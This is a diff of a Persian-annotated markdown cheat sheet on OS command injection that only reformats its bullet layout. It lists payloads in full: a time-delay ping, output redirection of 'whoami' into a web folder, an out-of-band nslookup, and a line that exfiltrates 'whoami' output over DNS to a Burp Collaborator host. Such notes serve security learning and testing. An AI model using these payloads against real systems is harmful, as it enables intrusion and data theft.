@@ -23,13 +23,16 @@
     - ```x||ping+-c+10+127.0.0.1||```
     - <p align="right">در این حالت پس از اجرای دستور فوق، 10 ثانیه طول می کشد تا response را در مرورگر مشاهده کنیم</p> 
 
-- **Output redirection** : ```||whoami>/var/www/images/output.txt||```
+- **Output redirection**
+    - ```||whoami>/var/www/images/output.txt||```
     - <p align="right">عکس ها در مسیر فوق ذخیره شده اند، در این حالت، خروجی دستور در مسیر share شده ذخیره می گردد و بعدا می توانیم یکی از عکس های محصولات را باز کرده، سپس نام  فایل را با نام output.txt تغییر دهیم، تا نتیجه دستور را مشاهده کنیم</p>
 
-- **Out-of-band interaction** : ```x||nslookup+7goyqnfizle0fk6mj5zk5qjtrkxalz.burpcollaborator.net```
+- **Out-of-band interaction**
+    - ```x||nslookup+7goyqnfizle0fk6mj5zk5qjtrkxalz.burpcollaborator.net```
     - <p align="right">در اینحالت سرور می تواند به یک آدرس بیرونی وصل شود، برای بررسی از Burp Collaborator استفاده می کنیم </p>
 
-- **Out-of-band data exfilteration** : ```||nslookup+`whoami`.x0y8fg1javlrivvsd4hp2koh58byzn.burpcollaborator.net||```
+- **Out-of-band data exfilteration**
+    - ```||nslookup+`whoami`.x0y8fg1javlrivvsd4hp2koh58byzn.burpcollaborator.net||```
     - <p align="right">در اینحالت می خواهیم نتیجه دستور در کوئری DNS به سمت سرور مهاجم در اینترنت ارسال شود، که در اینجا از Burp Collaborator استفاده شده (باید بر روی Pull now کلیک شود) و خروجی به شکل "peter-jSRUyX.x0y8fg1javlrivvsd4hp2koh58byzn.burpcollaborator.net.burpcollaborator.net" خواهد بود.</p>
 
 # Code Execution
